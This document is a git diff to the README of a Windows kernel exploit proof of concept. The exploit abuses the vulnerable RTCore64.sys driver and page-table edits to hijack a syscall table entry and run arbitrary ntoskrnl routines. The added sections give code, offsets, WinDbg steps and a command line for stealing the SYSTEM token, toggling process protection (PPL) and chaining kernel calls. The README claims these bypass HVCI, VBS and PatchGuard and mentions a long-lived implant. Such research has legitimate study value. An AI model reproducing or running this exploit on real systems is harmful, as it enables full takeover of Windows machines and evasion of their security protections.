@@ -175,6 +175,8 @@ To hijack `NtSetQuotaInformationFile`:
 
 ### Code Walkthrough
 
+> ℹ️ The steps below describe the conceptual sequence. In the actual source the work is split into three reusable primitives on `kernelHelper` — `prepareHijack()` (steps 1–4), `pointSyscallTo(target, stackArgs)` (step 5), and `restoreHijack()` (step 8) — so it can be reused for the `/privesc` demo and for arbitrary target routines. See **Generalizing the hijack** further down.
+
 #### 1. **Find ntoskrnl Base Address**
 
 ```cpp
@@ -251,14 +253,15 @@ NTSTATUS status = HijackedSyscall((HANDLE)pid, (DWORD64)PEProcess);
 ```masm
 HijackedSyscall PROC
 	mov r10, rcx
-	int 3;
-	mov eax, syscallNumber ; syscall number for NtAllocateVirtualMemory
+	mov eax, syscallNumber  ; populated at runtime from ntdll!NtSetQuotaInformationFile
 	syscall
 	ret
 HijackedSyscall ENDP
 ```
 
 You call the syscall, which now executes `PsLookupProcessByProcessId` in kernel context, passing a PID and an allocated memory buffer to receive the EPROCESS pointer.
+
+> Because the stub is just the standard syscall ABI, it works for any routine arity. The C++ side casts `HijackedSyscall` to one of `PFN_HSC_2` … `PFN_HSC_8` (declared in `kernelHelperUtil.h`) to match the redirect target's signature — `PFN_HSC_2` for `PsLookupProcessByProcessId`, `PFN_HSC_3` for `memcpy`, etc.
 
 #### 7. **Read Process Name**
 
@@ -297,20 +300,232 @@ You restore:
 
 ---
 
-### 🧾 Required Offsets for your windows build (in `offsets.h`)
+### 🧾 Offsets — what's dynamic vs. what you must verify
 
-For the project to work on your system, you need to change these offsets to match your Windows version.
+The project splits offsets into two groups: **dynamic** (resolved at runtime, no edit needed) and **manual** (must be confirmed in WinDbg for your kernel build).
+
+#### ✅ Dynamic — handled automatically by `kernelHelper::resolveKernelArtifacts()`
+
+| Item | How it's resolved |
+| --- | --- |
+| `NtSetQuotaInformationFile` syscall # | Read the 4 bytes after `B8` in the `ntdll!NtSetQuotaInformationFile` prologue (`4C 8B D1  B8 ?? ?? ?? ??`). |
+| `nt!PsLookupProcessByProcessId` address | `LoadLibraryEx("ntoskrnl.exe", DONT_RESOLVE_DLL_REFERENCES)` + `GetProcAddress` + (kernel base + RVA). |
+| `nt!memcpy` address (used by `/privesc` and `/ppl`) | Same trick. |
+| `ntoskrnl.exe` base | `EnumDeviceDrivers` (requires SYSTEM on modern Win11). |
+
+If any dynamic lookup fails, the code falls back to the hardcoded values in `offsets.h`.
+
+#### ⚠️ Manual — verify in WinDbg before running
+
+These cannot be resolved dynamically (not exported, or struct layouts). Wrong values will **BSOD** the box.
 
 ```cpp
-#define KeServiceDescriptorTableShadow_Offset_fromNT 0xfc5280
-#define NtSetQuotaInformationFile_syscallnumber 0x1b8
-#define PsLookupProcessByProcessId_Offset_fromNT 0x906ea0
-#define MiGetPteAddress_Offset_fromNT 0x438d93
+// kd> ? nt!KeServiceDescriptorTableShadow - nt
+#define KeServiceDescriptorTableShadow_Offset_fromNT 0xfc6280
+
+// PTE_BASE pointer lives at (MiGetPteAddress + 0x13) inside ntoskrnl.
+// kd> ? (nt!MiGetPteAddress + 0x13) - nt
+#define MiGetPteAddress_Offset_fromNT 0x4336e3
+
+// kd> dt nt!_EPROCESS ImageFileName
 #define imageFileNameOffset 0x338
+
+// kd> dt nt!_EPROCESS Token
+// EX_FAST_REF — low 4 bits = cached ref count, upper bits = token pointer.
+#define tokenOffset 0x4b8
+
+// kd> dt nt!_EPROCESS Protection
+// _PS_PROTECTION (1 byte): Type bits 0..2, Audit bit 3, Signer bits 4..7.
+// Only needed if you use /ppl.
+#define protectionOffset 0x6fa
 ```
+
+#### 🧪 One paste-block to verify everything before running
+
+This is the full WinDbg pre-flight checklist for the project. Paste it into your live-kernel session against the same `ntoskrnl.exe` the binary will run against — every line in the output corresponds to one `#define` in `offsets.h`.
+
+```
+kd> ? nt!KeServiceDescriptorTableShadow - nt
+kd> ? (nt!MiGetPteAddress + 0x13) - nt
+kd> dt nt!_EPROCESS ImageFileName Token Protection
+```
+
+What you should see, and which `#define` each line feeds:
+
+| WinDbg output | Maps to `offsets.h` define |
+| --- | --- |
+| `Evaluate expression: <hex> = ` from line 1 | `KeServiceDescriptorTableShadow_Offset_fromNT` |
+| `Evaluate expression: <hex> = ` from line 2 | `MiGetPteAddress_Offset_fromNT` |
+| `+0x??? ImageFileName` | `imageFileNameOffset`   *(all three demos)* |
+| `+0x??? Token` | `tokenOffset`           *(`/privesc`)* |
+| `+0x??? Protection` | `protectionOffset`      *(`/ppl` only)* |
+
+If any value differs from the `offsets.h` constant currently checked in, **edit `offsets.h` before rebuilding** — every one of these is a BSOD vector if wrong on a live kernel.
+
+Bonus: if you also want to confirm the runtime-resolved items aren't drifting (e.g. you suspect a Windows update changed something), the WinDbg one-liners are:
+
+```
+kd> u ntdll!NtSetQuotaInformationFile L1   ; first instruction; the syscall # is the imm32 after `mov eax`
+kd> ? nt!PsLookupProcessByProcessId - nt
+kd> ? nt!memcpy - nt
+```
+
+You shouldn't need to edit anything for these — they're resolved at runtime from `ntdll` / `ntoskrnl` exports — but it's a quick sanity check before you trust the `[>]` resolution lines the binary prints on startup.
 
 ---
 
+### 🧬 Generalizing the hijack — calling any API with any arity
+
+There are two pieces here: **the table entry** (how the kernel finds the routine to call), and **the arguments** (how data gets from your `((PFN_HSC_N)HijackedSyscall)(...)` C++ call all the way into the hijacked routine's registers and stack). They're independent — the entry tells the kernel *what to call*, the calling convention tells it *what to pass*.
+
+#### The `KiServiceTable` entry — a packed 32-bit DWORD
+
+```
+ 31                                            4 │ 3        0
+┌─────────────────────────────────────────────────┼────────────┐
+│   signed byte offset from KiServiceTable        │  stackArgs │
+│   (routine_addr − KiServiceTable)               │            │
+└─────────────────────────────────────────────────┴────────────┘
+```
+
+- **Bits 4..31** — `(routine_addr − KiServiceTable)` shifted *left* by 4. The kernel reads them back with an arithmetic shift right by 4, so the offset is treated as signed (the routine can sit below the table, though in practice it doesn't).
+- **Bits 0..3** — `stackArgs`, the count of 8-byte arguments **beyond** the 4 register args. So a 2-arg or 4-arg routine → 0. A 7-arg routine → 3. An 8-arg routine → 4.
+
+`pointSyscallTo(addr, stackArgs)` builds this DWORD and writes it via the R/W primitive:
+
+```cpp
+DWORD entry = ((DWORD)(routine_addr - KiServiceTable) << 4) | (stackArgs & 0xF);
+WriteMemoryPrimitive(4, KiServiceTable + syscallNum*4, entry);
+```
+
+#### How arguments flow into the hijacked routine
+
+Microsoft x64 ABI everywhere — same convention in user mode, in the asm stub, and in the kernel-side handler. The only twist is the `syscall` instruction in the middle, which the asm stub bridges.
+
+```
+┌─── User mode ───────────────────────────────────────────────────────────┐
+│                                                                         │
+│  ((PFN_HSC_3)HijackedSyscall)(a, b, c);                                 │
+│                                                                         │
+│  Compiler emits (Microsoft x64 ABI):                                    │
+│      RCX = a                                                            │
+│      RDX = b                                                            │
+│      R8  = c                                                            │
+│      R9  = arg4   (if present)                                          │
+│      [rsp+0x28]   = arg5  ┐                                             │
+│      [rsp+0x30]   = arg6  │  (caller's frame, after the                 │
+│      [rsp+0x38]   = arg7  │   call instruction's return-addr push)      │
+│      ...                  ┘                                             │
+│                                                                         │
+│  HijackedSyscall asm stub:                                              │
+│      mov  r10, rcx           ; SYSCALL clobbers RCX with return addr,   │
+│                              ; so arg1 is staged in R10 first           │
+│      mov  eax, syscallNumber ; resolved syscall # of NtSetQuotaInfoFile │
+│      syscall                 ; CPU: R11=RFLAGS, RCX=RIP, RIP=LSTAR      │
+│                                                                         │
+└─────────────────────────────────────────────────────────────────────────┘
+                                  │
+                                  ▼  (mode switch via SYSCALL)
+┌─── Kernel mode ─────────────────────────────────────────────────────────┐
+│                                                                         │
+│  nt!KiSystemCall64:                                                     │
+│      • switches to kernel stack, builds trap frame, saves user state    │
+│      • reads EAX (syscall #)                                            │
+│      • fetches entry = KiServiceTable[EAX]                              │
+│      • decodes:  routine     = KiServiceTable + (entry >> 4)            │
+│                  stack_args  = entry & 0xF                              │
+│      • if stack_args > 0, KiSystemServiceCopyEnd copies stack_args*8    │
+│        bytes from the user stack ([user_rsp+0x28]…) onto the kernel     │
+│        stack at the same offset (so [k_rsp+0x28]… is identical to       │
+│        what the caller staged)                                          │
+│      • restores RCX from R10  (RCX = a again)                           │
+│      • calls routine(RCX, RDX, R8, R9, [rsp+0x28]…)                     │
+│                                                                         │
+│  The hijacked routine sees:                                             │
+│      RCX = a, RDX = b, R8 = c, R9 = arg4,                               │
+│      [rsp+0x28]+ = whatever stack args the caller staged                │
+│  — identical to a direct kernel call. No fix-ups needed.                │
+│                                                                         │
+└─────────────────────────────────────────────────────────────────────────┘
+```
+
+Three things to take away from that flow:
+
+1. **The asm stub is arity-agnostic.** Same 4 instructions whether you're calling a 2-arg routine or an 8-arg one. The compiler on the C++ side stages everything correctly because you cast to the matching `PFN_HSC_N` typedef.
+2. **`stackArgs` in the table entry is what makes >4-arg calls work.** Forget to set it and the kernel won't copy your `[rsp+0x28]+` data over — the hijacked routine reads garbage for args 5+ and BSODs (or worse, silently misbehaves).
+3. **Arg 1 surviving the SYSCALL relies on R10.** That's the whole reason for `mov r10, rcx` — the SYSCALL instruction overwrites RCX with the return address, so the kernel-side handler restores RCX from R10 before invoking the target routine.
+
+#### Putting it together
+
+```cpp
+helper.prepareHijack();                                  // flip PDE R/W, save state
+helper.pointSyscallTo(target_kernel_addr, /*stackArgs*/0);
+NTSTATUS s = ((PFN_HSC_3)HijackedSyscall)(a, b, c);      // 3 args, all in regs
+
+helper.pointSyscallTo(other_kernel_addr, /*stackArgs*/3); // redirect to a 7-arg API
+NTSTATUS s2 = ((PFN_HSC_7)HijackedSyscall)(a,b,c,d,e,f,g);
+
+helper.restoreHijack();                                  // restore entry + PDE
+```
+
+The `PFN_HSC_2` … `PFN_HSC_8` typedefs live in `kernelHelperUtil.h`; cast `HijackedSyscall` to the one that matches the routine's arity. The same syscall slot can be repointed any number of times between `prepareHijack()` and `restoreHijack()` — that's exactly how `/privesc` chains two different routines through one hijack window.
+
+---
+
+### 🔓 Privesc demo — `/privesc <PID>`
+
+`bool kernelHelper::privesc(DWORD32 pid)` chains two hijacks to elevate the target process's primary token to SYSTEM:
+
+1. **`prepareHijack()`** — flip the PDE R/W bit, snapshot the original entry.
+2. **Hijack #1** → `PsLookupProcessByProcessId`. Called twice in the same hijack window:
+   - once for the target PID → returns target `EPROCESS`,
+   - once for PID 4 (System) → returns SYSTEM `EPROCESS`.
+3. Read both `EPROCESS.Token` (EX_FAST_REF) values through the existing R/W primitive. Compute `newToken = (system & ~0xF) | (target & 0xF)` — keep the target's cached ref count, take SYSTEM's pointer bits.
+4. **Hijack #2** → `nt!memcpy`. The same syscall slot is now redirected to a 3-arg API. Call it as `memcpy((PVOID)(targetEPROC + Token), &newToken, sizeof(DWORD64))` — the actual token write happens **in kernel mode**, not via the RTCore64 R/W primitive.
+5. **`restoreHijack()`** — restore the original entry + PDE flags.
+
+After this returns, any new process spawned by the target PID (or the next time a privileged check is made against it) runs as SYSTEM.
+
+> ⚠️ The EPROCESS refs taken by `PsLookupProcessByProcessId` are intentionally not released in this PoC (the routine returns a referenced object). For a long-lived implant you'd want to call `ObfDereferenceObject` (also via a hijack) to balance the refcount.
+
+---
+
+### 🛡️ PPL toggle — `/ppl <PID> <0|1>`
+
+`bool kernelHelper::pplToggle(DWORD32 pid, BOOL makeProtected)` reuses the same two-hijack pattern as `/privesc`, but writes a **single byte** instead of a token pointer. The byte sits at `_EPROCESS.Protection` (offset = `protectionOffset` in `offsets.h`):
+
+```
+_PS_PROTECTION  (1 byte total)
+┌────────────┬──────┬───────────────────┐
+│  Signer    │ Aud  │      Type         │
+│  bits 4..7 │ bit3 │   bits 0..2       │
+└────────────┴──────┴───────────────────┘
+```
+
+| Field | Values |
+|---|---|
+| `Type` | 0 = None · 1 = ProtectedLight (PPL) · 2 = Protected (PP) |
+| `Signer` | 0 = None · 1 = Authenticode · 4 = Windows · 6 = WinTcb · 7 = WinSystem · ... |
+
+The CLI maps:
+
+| `/ppl <PID> X` | Written byte | Decoded |
+|---|---|---|
+| `0` | `0x00` | unprotected |
+| `1` | `0x61` | Type = ProtectedLight, Signer = WinTcb  (same as LSASS) |
+
+Sequence:
+
+1. **`prepareHijack()`** — flip the PDE R/W bit, snapshot the original entry.
+2. **Hijack #1** → `PsLookupProcessByProcessId(pid, &out)` to fetch the target's `EPROCESS`.
+3. **Read** the current Protection byte via the R/W primitive (display-only — lets you see the before-state).
+4. **Hijack #2** → `memcpy(targetEPROC + Protection, &newByte, 1)` — kernel-mode 1-byte write that flips `_PS_PROTECTION`.
+5. **Verify** by re-reading via the R/W primitive.
+6. **`restoreHijack()`** — restore the original entry + PDE flags.
+
+The same caveats as `/privesc` apply (`memcpy` must resolve, the EPROCESS lookup leaks a ref). One extra: **on modern kernels, setting PPL via only the Protection byte isn't always sufficient** — `SignatureLevel` and `SectionSignatureLevel` (single-byte fields adjacent to Protection) may also be checked by certain code paths (e.g., DLL-loading enforcement). For full LSASS-style PPL, patch those too. The `/ppl` demo intentionally writes only one byte so the technique stays minimal and obvious.
+
+---
 
 ### 🔐 Security Bypass Summary
 
@@ -323,6 +538,8 @@ This technique effectively bypasses multiple modern kernel security mechanisms:
 **W^X Policies:** We never write to executable memory directly — memory remains either writable or executable, but not both.
 
 **Hypervisor-based protections & VBS:** Hijacking the syscall doesn't violate HVCI because it's only read write bit we are changing or modifying in the page tables. hyperv will trust the kernel with these changes. the normal page tables will not be verified by the EPT if you change something from read to write or write to read :) => it's by design.
+
+> Every demo in this repo (`/codeexecution`, `/privesc`, `/ppl`) only calls code that already lives in `ntoskrnl.exe`'s `.text`, which HVCI keeps RX-locked in EPT — so HVCI's W^X enforcement never has anything to object to. Combined with the data-only PDE flip above, that's why the technique works end-to-end on a fully VBS-hardened Win11 box.
 
 **PatchGuard:** PatchGuard watches for modifications to critical structures. However, since this hijack is temporary and fully restored shortly after execution, it significantly lowers the risk of PatchGuard triggering a bug check.
 
@@ -346,6 +563,16 @@ This will launch a command shell as SYSTEM, allowing the exploit to function cor
 If you're restricted to medium integrity, you can use a side-channel technique to leak the kernel base address instead nowadays. A tool for this is available here:
 
 👉 https://github.com/exploits-forsale/prefetch-tool
+
+#### CLI
+
+```
+KernelCodeExecution.exe /installDriver              # one-shot: register RTCore64.sys
+KernelCodeExecution.exe /codeexecution <PID>        # demo 1: read target process's image name
+KernelCodeExecution.exe /privesc       <PID>        # demo 2: swap target's token to SYSTEM
+KernelCodeExecution.exe /ppl           <PID> <0|1>  # demo 3: toggle PPL via 1-byte kernel memcpy
+KernelCodeExecution.exe /uninstallDriver            # cleanup
+```
 
 ![POC](./screenshots/POC.png)
 
